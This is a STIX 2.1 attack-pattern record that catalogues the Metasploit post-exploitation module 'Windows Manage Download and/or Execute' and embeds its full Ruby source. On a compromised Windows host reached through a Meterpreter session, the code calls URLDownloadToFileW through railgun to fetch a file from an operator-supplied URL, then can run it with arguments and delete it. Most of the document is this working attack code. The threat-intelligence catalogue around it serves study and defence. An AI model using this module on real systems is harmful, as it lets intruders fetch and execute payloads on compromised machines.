{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--446854c6-f980-4ab4-b07d-bb985d724e9d",
    "created": "2024-08-14T16:33:04.969597Z",
    "modified": "2024-08-14T16:33:04.969601Z",
    "name": "Windows Manage Download and/or Execute",
    "description": " This module will download a file by importing urlmon via railgun. The user may also choose to execute the file with arguments via exec_string.  'License' => MSF_LICENSE 'Platform' => ['win'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/download_exec.rb",
            "external_id": "download_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Download and/or Execute',\n        'Description' => %q{\n          This module will download a file by importing urlmon via railgun.\n          The user may also choose to execute the file with arguments via exec_string.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => ['RageLtMan <rageltman[at]sempervictus>'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_fs_file_expand_path\n              stdapi_fs_stat\n              stdapi_railgun_api\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('URL', [true, 'Full URL of file to download' ]),\n        OptString.new('DOWNLOAD_PATH', [false, 'Full path for downloaded file' ]),\n        OptString.new('FILENAME', [false, 'Name for downloaded file' ]),\n        OptBool.new('OUTPUT', [true, 'Show execution output', true ]),\n        OptBool.new('EXECUTE', [true, 'Execute file after completion', false ]),\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('EXEC_STRING', [false, 'Execution parameters when run from download directory' ]),\n        OptInt.new('EXEC_TIMEOUT', [true, 'Execution timeout', 60 ]),\n        OptBool.new('DELETE', [true, 'Delete file after execution', false ]),\n      ]\n    )\n  end\n\n  # Check to see if our dll is loaded, load and configure if not\n\n  def add_railgun_urlmon\n    if client.railgun.libraries.find_all { |d| d.first == 'urlmon' }.empty?\n      session.railgun.add_dll('urlmon', 'urlmon')\n      session.railgun.add_function(\n        'urlmon', 'URLDownloadToFileW', 'DWORD',\n        [\n          ['PBLOB', 'pCaller', 'in'],\n          ['PWCHAR', 'szURL', 'in'],\n          ['PWCHAR', 'szFileName', 'in'],\n          ['DWORD', 'dwReserved', 'in'],\n          ['PBLOB', 'lpfnCB', 'inout']\n        ]\n      )\n      vprint_good('urlmon loaded and configured')\n    else\n      vprint_status('urlmon already loaded')\n    end\n  end\n\n  def run\n    # Make sure we meet the requirements before running the script, note no need to return\n    # unless error\n    return 0 if session.type != 'meterpreter'\n\n    # get time\n    strtime = Time.now\n\n    # check/set vars\n    url = datastore['URL']\n    filename = datastore['FILENAME'] || url.split('/').last\n\n    path = datastore['DOWNLOAD_PATH']\n    if path.blank?\n      path = session.sys.config.getenv('TEMP')\n    else\n      path = session.fs.file.expand_path(path)\n    end\n\n    outpath = path + '\\\\' + filename\n    exec = datastore['EXECUTE']\n    exec_string = datastore['EXEC_STRING']\n    output = datastore['OUTPUT']\n    remove = datastore['DELETE']\n\n    # set up railgun\n    add_railgun_urlmon\n\n    # get our file\n    vprint_status(\"Downloading #{url} to #{outpath}\")\n    client.railgun.urlmon.URLDownloadToFileW(nil, url, outpath, 0, nil)\n\n    # check our results\n    begin\n      out = session.fs.file.stat(outpath)\n      print_status(\"#{out.stathash['st_size']} bytes downloaded to #{outpath} in #{(Time.now - strtime).to_i} seconds \")\n    rescue StandardError\n      print_error('File not found. The download probably failed')\n      return\n    end\n\n    # Execute file upon request\n    if exec\n      begin\n        cmd = \"\\\"#{outpath}\\\" #{exec_string}\"\n\n        print_status(\"Executing file: #{cmd}\")\n        res = cmd_exec(cmd, nil, datastore['EXEC_TIMEOUT'])\n        print_good(res) if output && !res.empty?\n      rescue ::Exception => e\n        print_error(\"Unable to execute: #{e.message}\")\n      end\n    end\n\n    # remove file if needed\n    if remove\n      begin\n        print_status(\"Deleting #{outpath}\")\n        session.fs.file.rm(outpath)\n      rescue ::Exception => e\n        print_error(\"Unable to remove file: #{e.message}\")\n      end\n    end\n  end\nend\n"
}